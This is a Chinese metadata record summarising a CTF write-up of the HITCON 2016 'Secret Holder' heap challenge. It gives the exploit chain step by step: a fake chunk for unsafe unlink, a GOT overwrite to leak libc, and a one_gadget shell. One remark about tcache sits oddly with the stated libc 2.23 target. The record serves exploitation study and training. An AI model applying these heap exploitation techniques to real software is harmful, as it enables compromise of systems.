...
quality: high
full_path: 漏洞学习之PWN-HITCON_CTF_2016-Secret_Holder.full.md
meta_path: 漏洞学习之PWN-HITCON_CTF_2016-Secret_Holder.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 'HITCON CTF 2016 Secret Holder - Unsafe Unlink PWN。HITCON 2016 Secret Holder：unsafe unlink + 三个 chunk 构造 + 改 free@GOT = puts 泄 libc + one_gadget 拿 shell。。关键路径：3 个 chunk: small (0x28) + medium (0xFA0...'
category: pwn
...
contest_type: open
wp_url: https://www.ctfiot.com/89243.html
reasoning_chain:
- '3 个 chunk: small (0x28) + medium (0xFA0) + large (0x61A80) → small_ptr=0x6020b0, big_ptr=0x6020a0'
- 触发点：keep_calloc(3) + wipe_free(3) 提高 mp_.n_mmaps_max 阈值
- 动作：keep_calloc(1)+wipe_free(1)+keep_calloc(2)+wipe_free(1)+keep_calloc(1)+keep_calloc(3)
- 观察：块1和块2地址相同 → 假设：double free 检查绕过（同地址不同指针）
- 构造 fake chunk：p64(0) + p64(0x21) + p64(small_ptr-0x18) + p64(small_ptr-0x10) + p64(0x20) + p64(0x61a90)
- 动作：renew(2, payload) → 改 fake chunk 的 fd/bk → 假设：unsafe unlink 触发
- 动作：wipe_free(3) → unsafe unlink → *small_ptr = big_ptr, *big_ptr = free@GOT
- 动作：renew(1, p64(elf.got['free']) + p64(big_ptr)) → 任意写 free@GOT = puts@PLT
- 动作：wipe_free(2) → puts(puts@GOT) → 泄 libc → puts_addr = u64(recvline()[:6])
- 动作：renew(1, p64(one_gadget 0x4527a)) → 写 puts@GOT = one_gadget → shell
failed_attempts:
- 试图直接 fastbin attack → 失败：必须先 unsafe unlink 拿任意写
- 试图跳过 double free 用 UAF → 失败：libc 2.23 检测同一指针 free 两次
- 试图解 keep_calloc 的 mp_ 阈值限制 → 失败：必须 keep_calloc(3)+wipe_free(3)
key_observations:
- unsafe unlink 是经典堆利用：fd/bk = ptr-0x18, ptr-0x10 → unlink 写 ptr
- 两个指针指向同一地址可绕过 double free 检测
- calloc 不取 tcache，可绕过 tcache 检测的 fastbin 重复 free
- 改 free@GOT = puts@PLT 是 leak 套路
- HITCON 2016 Secret Holder 是 libc-2.23 unsafe unlink 经典题
prerequisites:
- glibc unsafe unlink 原理（fd/bk 校验 + unlink 宏）
- double free 绕过（同地址不同指针）
- calloc vs malloc 的 tcache 行为差异
- one_gadget 工具与 libc 偏移
---
